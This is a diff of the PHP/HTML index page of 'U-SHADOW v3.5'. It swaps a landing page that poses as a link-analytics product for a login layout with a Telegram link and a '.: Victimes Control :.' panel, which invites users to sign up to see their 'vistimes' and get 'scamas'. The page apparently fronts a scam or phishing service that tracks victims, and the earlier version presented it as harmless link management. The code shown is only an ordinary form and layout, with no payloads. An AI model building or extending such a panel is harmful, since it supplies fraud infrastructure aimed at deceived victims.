@@ -37,99 +37,80 @@ $csrf_token = generate_csrf_token();
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>U-shadow | Social Link Hub & Analytics</title>
+    <title>U-SHADOW | Login</title>
     <link rel="stylesheet" href="/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
-<body>
+<body class="old-index-body">
 
-<section class="landing-hero">
-    <div class="hero-container">
-        <div class="hero-content">
-            <h1>U-SHADOW</h1>
-            <p>The all-in-one professional link management and real-time analytics platform for social media creators and business professionals.</p>
-            <?php if (!isset($_SESSION['user'])): ?>
-                <a href="signup.php" class="btn btn-primary" style="padding: 15px 40px; font-size: 18px;">Get Started for Free</a>
-            <?php else: ?>
-                <a href="dashboard.php" class="btn btn-primary" style="padding: 15px 40px; font-size: 18px;">Go to My Dashboard</a>
-            <?php endif; ?>
+<div class="container-old">
+    <header class="header-old-index">
+        <div class="smikta-logo-corner">
+            <div class="logo-diamond">SMIKTA</div>
         </div>
-    </div>
-</section>
+        <div class="telegram-banner">
+             <a href="https://t.me/your_telegram" target="_blank" class="btn-telegram">
+                <i class="fab fa-telegram"></i> Join Our Telegram
+             </a>
+        </div>
+    </header>
 
-<div style="background: #fff; padding: 60px 0;">
-    <div class="auth-body" style="min-height: auto; background: transparent;">
-        <div class="auth-card" style="box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
-            <div class="auth-header">
-                <h1>Member Login</h1>
-                <p>Welcome back! Sign in to manage your hubs.</p>
-            </div>
-            <div class="auth-content">
-                <?php if ($signup_success): ?>
-                    <div class="status-badge success" style="display: block; margin-bottom: 20px; text-align: center;">Account created successfully!</div>
-                <?php endif; ?>
+    <nav class="navbar-old">
+        <ul>
+            <li><a href="index.php"><i class="fas fa-home"></i> Home</a></li>
+            <li><a href="signup.php"><i class="fas fa-user-plus"></i> Sign Up</a></li>
+            <li><a href="#"><i class="fas fa-cut"></i> Short Your Link</a></li>
+            <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
+            <li><a href="#"><i class="fas fa-envelope"></i> Contact</a></li>
+        </ul>
+    </nav>
+
+    <main class="split-layout-old">
+        <section class="panel-old login-panel-old">
+            <div class="panel-header-old">Login Panel</div>
+            <div class="panel-body-old">
                 <?php if ($error): ?>
-                    <div class="status-badge error" style="display: block; margin-bottom: 20px; text-align: center;"><?php echo s($error); ?></div>
+                    <div class="status-badge error" style="display: block; margin-bottom: 15px;"><?php echo s($error); ?></div>
+                <?php endif; ?>
+                <?php if ($signup_success): ?>
+                    <div class="status-badge success" style="display: block; margin-bottom: 15px;">Success! Please login.</div>
                 <?php endif; ?>
 
-                <?php if (isset($_SESSION['user'])): ?>
-                    <div style="text-align: center;">
-                        <p>Logged in as <strong><?php echo s($_SESSION['user']['username']); ?></strong></p>
-                        <a href="dashboard.php" class="btn btn-primary" style="width: 100%; margin-bottom: 10px;">Dashboard</a>
-                        <a href="logout.php" class="btn" style="width: 100%; background: #eee; color: #333;">Sign Out</a>
+                <form method="POST">
+                    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
+                    <div class="form-group-old">
+                        <input type="text" name="username" placeholder="Username" required>
                     </div>
-                <?php else: ?>
-                    <form action="/index.php" method="POST">
-                        <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
-                        <div class="form-group">
-                            <label>Username</label>
-                            <input type="text" name="username" placeholder="Enter your username" required>
-                        </div>
-                        <div class="form-group">
-                            <label>Password</label>
-                            <input type="password" name="password" placeholder="Enter your password" required>
-                        </div>
-                        <button type="submit" class="btn btn-primary" style="width: 100%; padding: 12px; margin-top: 10px;">Sign In</button>
-                    </form>
-                <?php endif; ?>
+                    <div class="form-group-old">
+                        <input type="password" name="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="btn-old-submit">Sign In</button>
+                    <div style="margin-top: 10px; font-size: 11px;">
+                        <a href="#" style="color: #666; text-decoration: none;">Forgot Password?</a>
+                    </div>
+                </form>
+
+                <div class="ads-placeholder">
+                    <span style="color:red">A</span><span style="color:orange">D</span><span style="color:blue">S</span>
+                </div>
             </div>
-            <div class="auth-footer">
-                Don't have an account? <a href="signup.php">Join U-shadow</a>
+        </section>
+
+        <section class="panel-old victims-panel-old">
+            <div class="panel-header-old">.: Victimes Control :.</div>
+            <div class="panel-body-old" style="text-align: center; color: #999; min-height: 200px; display: flex; flex-direction: column; justify-content: center;">
+                <p>Soory You Must Be Member To See Your Vistimes</p>
+                <p>Sing Up for Get Your Profisionel Scamas</p>
+                <p><a href="signup.php" style="color: var(--primary);">Sing Up Here</a></p>
             </div>
-        </div>
-    </div>
+        </section>
+    </main>
+
+    <footer class="footer-old">
+        Copyright 2010-2025 | This Website Is Devlopped By K24KDX <br>
+        <strong>U-SHADOW v3.5 &copy;</strong>
+    </footer>
 </div>
-
-<section class="features-grid">
-    <div class="feature-card">
-        <i class="fas fa-chart-line"></i>
-        <h3>Advanced Tracking</h3>
-        <p>Monitor your performance with precision. See exactly when and how your audience interacts with your generated links.</p>
-    </div>
-    <div class="feature-card">
-        <i class="fas fa-bolt"></i>
-        <h3>Dynamic Redirection</h3>
-        <p>Fast, reliable, and intelligent link redirection ensuring your visitors always reach their destination seamlessly.</p>
-    </div>
-    <div class="feature-card">
-        <i class="fas fa-shield-alt"></i>
-        <h3>Enterprise Security</h3>
-        <p>Your data and privacy are our top priorities. We use industry-standard hashing and secure infrastructure to protect your account.</p>
-    </div>
-</section>
-
-<footer>
-    <div style="margin-bottom: 20px;">
-        <strong>U-SHADOW Professional v3.5</strong><br>
-        <span style="color: #a2a3b7;">Next-Generation Link Management</span>
-    </div>
-    <div style="margin-bottom: 20px;">
-        <a href="terms.php" style="color: var(--primary); text-decoration: none; margin: 0 10px;">Terms of Service</a>
-        <a href="privacy.php" style="color: var(--primary); text-decoration: none; margin: 0 10px;">Privacy Policy</a>
-        <a href="/admin/login.php" style="color: var(--primary); text-decoration: none; margin: 0 10px;">Admin Portal</a>
-    </div>
-    <p>&copy; 2010-2025 U-Shadow. All rights reserved. Developed by K24KDX</p>
-</footer>
 
 </body>
 </html>
